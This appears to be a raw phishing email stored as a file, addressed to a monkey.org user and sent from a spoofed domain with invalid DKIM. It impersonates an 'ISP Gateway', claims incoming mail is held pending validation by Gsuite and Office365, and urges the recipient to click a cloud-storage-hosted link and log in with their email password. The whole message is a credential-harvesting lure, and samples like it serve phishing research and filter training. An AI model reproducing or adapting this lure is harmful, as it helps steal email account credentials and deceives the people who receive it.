@@ -1,0 +1,153 @@
+Return-Path: info@srv-home.live
+Delivered-To: jose@monkey.org
+X-FDA: 77948427774.52.81ACDE7
+Received: from cp.srv-home.live (unknown [185.180.199.12])
+	by imf18.b.hostedemail.com (Postfix) with ESMTP id DBCC4868
+	for <jose@monkey.org>; Mon, 22 Mar 2021 19:00:58 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=dkim; d=afasa.com.mx;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:
+ Content-Transfer-Encoding; i=servicios.compras@afasa.com.mx;
+ bh=0gOx/Sa3tDiifLq7KnKnFqgZHDZDwxvJDW9oolmianY=; =?utf-8?q?b=3DxbNmdfgL7ZfS?=
+ =?utf-8?q?7Xdew0NehPsm4Hcbm+t+jx3uod2b9ASeEBBTyFM+PFc2dsgvTtvBEEyYzYSsS4hj?=
+  
+ ALahGYXDfgrsqhUqKBePyQrGenq994BlDKm0t9iXbJn3sFt56zK6mvxNB570/piu4L8kGQBaKzK6
+   gO5FFkfcUB7NM77drrA=
+From: "monkey.org" <servicios.compras@afasa.com.mx>
+To: jose@monkey.org
+Subject: Your E-mail  Requestjose@monkey.org
+Date: 22 Mar 2021 18:48:50 +0100
+Message-ID: <20210322184850.733B56665E972599@afasa.com.mx>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+Received-SPF: none (srv-home.live>: No applicable sender policy available)
+ receiver=imf18.b.tucows.com; identity=mailfrom;
+ envelope-from="<info@srv-home.live>"; helo=cp.srv-home.live;
+ client-ip=185.180.199.12
+X-HE-DKIM-Result: invalid/invalid (public key: not available)
+X-Spam-Summary: =?utf-8?q?10=2C1=2C0=2C6916dae73b6b64e9=2Cd41d8cd98f00b204?=
+ =?utf-8?q?=2Cinfo=40srv-home=2Elive=2Cjose=40monkey=2Eorg=2CRULES=5FHIT=3A4?=
+ =?utf-8?b?MTo1Mzo3MjozNTU6Mzc1OjM3OTo4MDA6OTYyOjk2Nzo5NzM6OTgzOjk4ODo5ODk6?=
+ =?utf-8?q?1135=3A1137=3A1140=3A1147=3A1189=3A1208=3A1224=3A1256=3A1311=3A13?=
+ =?utf-8?q?13=3A1314=3A1345=3A1381=3A1431=3A1433=3A1434=3A1436=3A1437=3A1513?=
+ =?utf-8?q?=3A1515=3A1516=3A1517=3A1521=3A1534=3A1543=3A1588=3A1589=3A1592?=
+ =?utf-8?q?=3A1593=3A1594=3A1685=3A1711=3A1719=3A1730=3A1747=3A1777=3A1792?=
+ =?utf-8?q?=3A2107=3A2196=3A2198=3A2199=3A2200=3A2393=3A2525=3A2543=3A2559?=
+ =?utf-8?q?=3A2563=3A2610=3A2682=3A2685=3A2737=3A2828=3A2859=3A2900=3A2933?=
+ =?utf-8?q?=3A2937=3A2939=3A2942=3A2945=3A2947=3A2951=3A2954=3A3000=3A3022?=
+ =?utf-8?q?=3A3138=3A3139=3A3140=3A3141=3A3142=3A3148=3A3352=3A3867=3A3868?=
+ =?utf-8?q?=3A3870=3A3871=3A3873=3A3934=3A3936=3A3938=3A3941=3A3944=3A3947?=
+ =?utf-8?q?=3A3950=3A3953=3A3956=3A3959=3A4552=3A4860=3A5007=3A6653=3A6669?=
+ =?utf-8?q?=3A6674=3A6678=3A7903=3A8517=3A8518=3A8568=3A8596=3A8603=3A8957?=
+ =?utf-8?q?=3A9025=3A9080=3A10004=3A10346=3A11253=3A11658=3A12043=3A12114=3A?=
+ =?utf-8?q?12291=3A12297=3A12438=3A12683=3A12955=3A12958=3A12965=3A12986=3A1?=
+ =?utf-8?q?3139=3A13141=3A13230=3A13439=3A13868=3A14093=3A14096=3A14181=3A14?=
+ =?utf-8?q?721=3A14822=3A14885=3A14935=3A15054=3A21080=3A21212=3A21349=3A214?=
+ =?utf-8?q?33=3A21451=3A21524=3A21554=3A21627=3A21660=3A21740=3A21796=3A2181?=
+ =?utf-8?q?0=3A21819=3A21939=3A21985=3A30003=3A30021=3A30022=3A30037=3A30054?=
+ =?utf-8?q?=3A30059=3A30069=2C0=2CRBL=3A04yf8neqdazydx75np3k33gfdxtimyrfro35?=
+ =?utf-8?q?b_7pgmqxj9bt159y3di7yyg9xzna=2Eif8zgjj47iaq1sb46x3n9hbnkcqskcs8fe?=
+ =?utf-8?q?xt8grcnxecodsy5kymyypsxgcdit6=2Ew6xi1tbioqqsoew8aao3pyyoc6j8-lbl8?=
+ =?utf-8?q?=2Emailshell=2Enet-223=2E238=2E255=2E100=2CCacheIP=3Anone=2CBayes?=
+ =?utf-8?b?aWFuOjAuNSwwLjUsMC41LE5ldGNoZWNrOm5vbmUsRG9tYWluQ2FjaGU6MCxNU0Y6?=
+ =?utf-8?q?not?=
+ bulk,SPF:,MSBL:0,DNSBL:neutral,Custom_rules:0:0:0,LFtime:27,LUA_SUMMARY:none
+X-HE-Tag: 1616439658-768783
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 24
+
+<html>
+
+<head>
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Dwindows-1=
+252">
+<title>New Page 1</title>
+</head>
+
+<body>
+
+<div style=3D"-webkit-font-smoothing: antialiased; margin: 30px 0px 0px; pa=
+dding: 0px; border: 0px; font-style: normal; font-variant-ligatures: normal=
+; font-variant-caps: normal; font-variant-numeric: inherit; font-variant-ea=
+st-asian: inherit; font-weight: 400; font-stretch: inherit; font-size: 14px=
+; line-height: inherit; font-family: Verdana, Geneva, sans-serif, serif, Em=
+ojiFont; vertical-align: baseline; color: rgb(32, 31, 30); letter-spacing: =
+normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: no=
+ne; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-=
+width: 0px; background-color: rgb(255, 255, 255); text-decoration-thickness=
+: initial; text-decoration-style: initial; text-decoration-color: initial;"=
+>
+	<p style=3D"-webkit-font-smoothing: antialiased;" align=3D"center">To,=20
+	jose@monkey.org</p>
+	<p style=3D"-webkit-font-smoothing: antialiased;" align=3D"center">Your in=
+coming=20
+	messages are now queued up and pending delivery,<br style=3D"-webkit-font-=
+smoothing: antialiased;">
+	because your address has not been validated by Gsuite and Office365 server=
+s.</p>
+	<p style=3D"-webkit-font-smoothing: antialiased;" align=3D"center">
+	You are required to validate your address jose@monkey.org to restore norma=
+l=20
+	inbox delivery.<br style=3D"-webkit-font-smoothing: antialiased;">
+	&nbsp;</p>
+	<p style=3D"-webkit-font-smoothing: antialiased;" align=3D"center">
+	<font color=3D"#0000FF"><strong>
+	____________________________________________________</strong></font></p>
+
+		<table width=3D"39%" bgcolor=3D"#045FB4" height=3D"60" align=3D"center" i=
+d=3D"table2"><tr><td>
+		<div align=3D"center">
+		<a href=3D"https://storage.cloud.google.com/moonmenermaintain-66j/fcco2in=
+dex.html#jose@monkey.org"=20
+		target=3D"_blank" style=3D"text-decoration:none">
+		<font face=3D"calibri" size=3D"+2" color=3D"#ffffff">
+		Validate jose@monkey.org Now
+		</font>
+		</a>
+		</div>
+		</td></tr></table>
+
+	<p style=3D"-webkit-font-smoothing: antialiased;" align=3D"center">&nbsp;&=
+nbsp;Please=20
+	note:<br>
+	<br>
+	Login with your eMail jose@monkey.org Password <br>
+	to validate, be sure to do so in a Secure Manner.<br>
+	<br>
+	Once validated your Email Delivery system would be working<br>
+	in Less Than 2 Hours.<br>
+	<br>
+	Sincerely,<br>
+	monkey.org ISP Gateway.</p>
+	<p style=3D"-webkit-font-smoothing: antialiased;" align=3D"center">
+	<br style=3D"-webkit-font-smoothing: antialiased;">
+	______________________________________________________________________</di=
+v>
+<div style=3D"-webkit-font-smoothing: antialiased; margin: 10px 0px 0px; pa=
+dding: 0px; border: 0px; font-style: normal; font-variant-ligatures: normal=
+; font-variant-caps: normal; font-variant-numeric: inherit; font-variant-ea=
+st-asian: inherit; font-weight: 400; font-stretch: inherit; font-size: 11.9=
+px; line-height: 2; font-family: Verdana, Geneva, sans-serif, serif, EmojiF=
+ont; vertical-align: baseline; color: rgb(131, 130, 130); letter-spacing: n=
+ormal; orphans: 2; text-align: start; text-indent: 0px; text-transform: non=
+e; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-w=
+idth: 0px; background-color: rgb(255, 255, 255); text-decoration-thickness:=
+ initial; text-decoration-style: initial; text-decoration-color: initial;">=
+
+	<p align=3D"center"><em style=3D"-webkit-font-smoothing: antialiased;">Thi=
+s is a=20
+	mandatory service communication for jose@monkey.org.</em>&nbsp;| If you no=
+=20
+	longer wish to receive this email&nbsp;<a target=3D"_blank" rel=3D"norefer=
+rer noopener" data-auth=3D"NotApplicable" style=3D"-webkit-font-smoothing: =
+antialiased; margin: 0px; padding: 0px; border: 0px; font: inherit; vertica=
+l-align: baseline;" href=3D"mailto:unsubscribe@monkey.org">Unsubscribe</a><=
+/div>
+
+</body>
+
+</html>
+
